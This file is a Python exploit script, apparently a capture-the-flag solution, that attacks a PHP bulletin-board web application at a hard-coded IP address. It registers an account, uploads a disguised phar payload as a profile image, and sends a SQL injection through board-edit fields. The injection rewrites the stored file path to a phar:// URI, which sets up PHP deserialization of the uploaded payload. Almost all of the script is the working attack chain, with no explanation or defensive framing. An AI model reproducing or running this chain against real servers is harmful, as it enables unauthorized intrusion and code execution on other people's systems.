import requests

url = 'http://52.79.217.37:10001'
ID = PW = 'helloworld1111'
# URL = 'http://localhost:10001'

def string_to_hex(input_string):
    hex_result = ''.join(format(ord(char), '02x') for char in input_string)
    return f'0x{hex_result}'

s = requests.Session() 

r = s.post(
    f"{url}/users/registerapi.php", 
    data={
        "user": ID, 
        "pass": PW
    }
)
assert r.status_code == 200

r = s.post(
    f"{url}/users/loginapi.php", 
    data={
        "user": ID, 
        "pass": PW  
    }
)
assert r.status_code == 200

r = s.post(
    f'{url}/users/editapi.php', 
    data={
        'user': ID,
        'pass': PW
    }, 
    files={
        'file': ('file.jpg', open('payload.jpg', 'rb'), 'image/jpg')
    }
)
assert r.status_code == 200

r = s.post(
    f"{url}/users/loginapi.php", 
    data={
        "user": ID, 
        "pass": PW  
    }
)
assert r.status_code == 200

r = s.post(f"{url}/users/profileapi.php")
assert r.status_code == 200

filepath = f'/var/www/html{r.json()["filepath"]}'

r = s.post(
    f'{url}/board/createapi.php', 
    data={
        'title': 'asd',
        'content': 'asd',
        'bname': 'main'
    }
)
assert r.status_code == 200

index = r.json()['idx']

payload = f'phar://{filepath}'

r = s.post(
    f'{url}/board/editapi.php', 
    data={
        'idx': index,
        'bname': '&#092;\' UNION SELECT &quot;&quot;,&quot;main,users#&quot;,&quot;&quot;,&quot;&quot;;#',
        'toname': 'main,users#',
        'title': f'\n SET users.filepath={string_to_hex(payload)} WHERE users.user={string_to_hex(ID)}#',
    }
)
print(r.text)

r = s.post(f'{url}/users/profileapi.php')
print(r.text)